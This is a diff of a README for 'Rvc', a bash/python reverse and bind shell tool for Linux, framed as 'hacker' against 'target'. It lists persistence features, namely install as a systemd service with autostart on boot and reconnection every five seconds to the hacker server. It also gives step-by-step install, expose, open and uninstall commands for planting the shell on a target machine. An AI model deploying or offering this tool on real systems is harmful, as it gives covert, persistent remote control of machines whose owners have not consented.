@@ -1,9 +1,13 @@
-# Rvc Reverse shell
+# Rvc Reverse and Bind shell
 
-A script for creating a reverse shell tunnel for linux servers 
-Not actual rsh that uses RCE for injecting the RSH vulnerability.
+A script for creating a reverse and bind shell tunnel for linux servers 
+Not actual rsh that uses RCE for injecting the vulnerability.
 
-![demo image](demo.jpg)
+Reverse Shell:
+![demo image0](demo-rsh.jpg)
+
+Bind Shell:
+![demo image1](demo-bsh.jpg)
 
 ## Features
 
@@ -14,9 +18,7 @@ Not actual rsh that uses RCE for injecting the RSH vulnerability.
 5) Dynamic communiation with the launched command.
 6) Install and uninstall as a systemd service on target with autostart on boot.
 7) Target RSH client always tries every 5 seconds to reconnect to the hacker server.
-8) Handles ip address and port number things by itself. Automatically gets the hacker ip address
-9) A connection is recognized by target pc id which we would assign, Just to mention the pc id.
-10) Less bandwidth consumption and never hangs up.
+8) Less bandwidth consumption and never hangs up.
 
 ## Getting Started
 
@@ -27,42 +29,52 @@ These instructions will get you a copy of the project up and running on your loc
 This script was tested on Ubuntu 18.04 LTS and Kali Linux 2019.3
 However this script needs some basic bash primitives in a normal linux distribution.
 
-Server side:: Target side (acting as reverse Client)
-1) python (2 or 3)
-2) stty (for setting terminal window)
-3) systemctl service support (for installation and autostart)
+Server side:: Target side
+1) bash
+2) python (2 or 3)
+3) stty (for setting terminal window)
+4) systemctl service support (for installation and autostart)
 
-Client side:: Hacker side (acting as reverse Server)
-1) python (2 or 3)
-2) stty (for getting hacker terminal sizes)
-3) awk interpreter and hostname utility
+Client side:: Hacker side 
+1) bash
+2) python (2 or 3)
+3) stty (for getting hacker terminal sizes)
+4) awk interpreter and hostname utility
 
 ## Deployment
 
 The following steps will guide you setting up a Reverse Shell between two pcs in same network
 
-1) On hacker terminal run
+to set the reverse shell to connect to the hacker ip address.
+
+1) Copy this file on Target pc and either install (run as root) or expose its terminal to hacker pc. Run
 ```
-./rvc-rsh configure
-```
-to set the reverse shell to connect to the hacker ip address 
-2) Copy this file on Target pc and either install (run as root) or expose its terminal to hacker pc. Run
-```
-./rvc-rsh install (pc id)
+./rvc-rsh install (hacker hostname) (port no)
 or
-./rvc-rsh expose (pc id)
+./rvc-rsh expose  (hacker hostname) (port no)
+
+for bsh
+
+./rvc-bsh install (target hostname) (port no)
+or
+./rvc-bsh expose  (target hostname) (port no)
+
+
+uninstall on target:
+./rvc-rsh uninstall
+or 
+./rvc-bsh uninstall
 ```
-Generally in computer labs connected with LAN the computers are labelled as pc0 pc1 pc2 etc..
-this pc id refers to same kind of number through which you will identify which shell to recieve connection from.
-If in case you have multiple rsh clients waiting for you on network.
-In this script a base port (1234) is assigned and communication for a pc id x will occur through port no (1234 + x)
-to distinguish between multiple rsh sessions on same network if they exist.
+Give the hostname and port no. to open a connection.
 Just remember for now the script supports only one rsh client install per target pc if you want to.
-3) on hacker terminal to open a client bearing some (pc id) run
+
+2) on hacker terminal to open a client bearing (hacker hostname) and (port no) run
 ```
-./rvc-rsh open (pc id)
+./rvc-rsh open (hacker hostname) (port no)
+for bsh
+./rvc-bsh open (target hostname) (port no)
 ```
-This will establish a TCP connection between the hacker as a server shell and the site as the client shell.
+This will establish a TCP connection between the hacker and the target shells
 And MAGIC !! you will entirely get the remote console with all above mentioned features !!
 
 ## Author
